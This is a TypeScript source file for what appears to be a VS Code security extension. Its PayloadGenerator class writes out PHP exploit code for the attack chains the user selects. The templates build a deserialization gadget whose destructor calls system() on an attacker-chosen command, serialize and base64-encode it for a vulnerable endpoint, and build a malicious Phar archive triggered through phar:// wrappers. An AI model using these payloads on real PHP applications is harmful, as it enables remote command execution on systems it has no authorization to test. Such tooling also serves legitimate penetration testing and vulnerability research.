import * as vscode from 'vscode';
import { AttackChain } from '../types';

export class PayloadGenerator {
    async generatePayload(chains: any[], document: vscode.TextDocument): Promise<string | null> {
        if (chains.length === 0) {
            return null;
        }

        // Let user select which chain to generate payload for
        const items = chains.map((chain: AttackChain, index: number) => ({
            label: chain.name,
            description: `${chain.riskLevel} - ${chain.exploitability}%`,
            detail: chain.description,
            chain: chain,
            index: index
        }));

        const selected = await vscode.window.showQuickPick(items, {
            placeHolder: 'Select an attack chain to generate exploit payload'
        });

        if (!selected) {
            return null;
        }

        return this.buildPayloadCode(selected.chain);
    }

    private buildPayloadCode(chain: AttackChain): string {
        let code = `<?php\n`;
        code += `/**\n`;
        code += ` * Exploit Payload Generator\n`;
        code += ` * Attack Chain: ${chain.name}\n`;
        code += ` * Risk Level: ${chain.riskLevel}\n`;
        code += ` * Exploitability: ${chain.exploitability}%\n`;
        code += ` */\n\n`;

        if (chain.name.includes('Deserialization')) {
            code += this.generateDeserializationPayload(chain);
        } else if (chain.name.includes('Phar')) {
            code += this.generatePharPayload(chain);
        } else {
            code += this.generateGenericPayload(chain);
        }

        code += `\n// Preconditions:\n`;
        for (const condition of chain.preconditions) {
            code += `//   - ${condition}\n`;
        }

        code += `\n// Mitigation:\n`;
        for (const mitigation of chain.mitigation) {
            code += `//   - ${mitigation}\n`;
        }

        return code;
    }

    private generateDeserializationPayload(chain: AttackChain): string {
        let code = `// Example Gadget Class\n`;
        code += `class Exploit {\n`;
        code += `    public $cmd;\n`;
        code += `    \n`;
        code += `    public function __construct($cmd) {\n`;
        code += `        $this->cmd = $cmd;\n`;
        code += `    }\n`;
        code += `    \n`;
        code += `    public function __destruct() {\n`;
        code += `        // This will be triggered after unserialize\n`;
        code += `        system($this->cmd);\n`;
        code += `    }\n`;
        code += `}\n\n`;

        code += `// Create exploit object\n`;
        code += `$exploit = new Exploit('whoami');\n\n`;

        code += `// Serialize the object\n`;
        code += `$payload = serialize($exploit);\n`;
        code += `echo "Serialized payload:\\n";\n`;
        code += `echo $payload . "\\n\\n";\n\n`;

        code += `// Base64 encode if needed\n`;
        code += `$encoded = base64_encode($payload);\n`;
        code += `echo "Base64 encoded payload:\\n";\n`;
        code += `echo $encoded . "\\n";\n\n`;

        code += `// Usage:\n`;
        code += `// Send this payload to the vulnerable endpoint via GET/POST parameter\n`;
        code += `// Example: ?data=<?php echo urlencode($encoded); ?>\n`;

        return code;
    }

    private generatePharPayload(chain: AttackChain): string {
        let code = `// Phar Deserialization Exploit\n\n`;

        code += `// Step 1: Create a gadget class (same as regular deserialization)\n`;
        code += `class Exploit {\n`;
        code += `    public $cmd = 'whoami';\n`;
        code += `    \n`;
        code += `    public function __destruct() {\n`;
        code += `        system($this->cmd);\n`;
        code += `    }\n`;
        code += `}\n\n`;

        code += `// Step 2: Create the phar file\n`;
        code += `$phar = new Phar('exploit.phar');\n`;
        code += `$phar->startBuffering();\n`;
        code += `$phar->addFromString('test.txt', 'test');\n`;
        code += `$phar->setStub('<?php __HALT_COMPILER(); ?>');\n\n`;

        code += `// Set metadata (this is where the exploit object goes)\n`;
        code += `$exploit = new Exploit();\n`;
        code += `$phar->setMetadata($exploit);\n`;
        code += `$phar->stopBuffering();\n\n`;

        code += `// Step 3: Use the phar file\n`;
        code += `// Trigger deserialization by accessing phar:// wrapper\n`;
        code += `// Examples:\n`;
        code += `//   file_exists('phar://exploit.phar/test.txt')\n`;
        code += `//   file_get_contents('phar://./exploit.phar')\n`;
        code += `//   getimagesize('phar://exploit.phar')\n\n`;

        code += `echo "Phar file created: exploit.phar\\n";\n`;
        code += `echo "Upload this file and trigger with phar:// wrapper\\n";\n`;

        return code;
    }

    private generateGenericPayload(chain: AttackChain): string {
        let code = `// Generic Exploit Template\n\n`;
        code += `echo "Attack Chain: ${chain.name}\\n";\n`;
        code += `echo "Description: ${chain.description}\\n\\n";\n\n`;

        code += `// Steps:\n`;
        for (let i = 0; i < chain.steps.length; i++) {
            const step = chain.steps[i];
            code += `// ${i + 1}. [${step.type}] ${step.description}\n`;
        }

        code += `\n// TODO: Implement exploit logic based on the attack chain\n`;
        code += `// Refer to the steps above for guidance\n`;

        return code;
    }
}
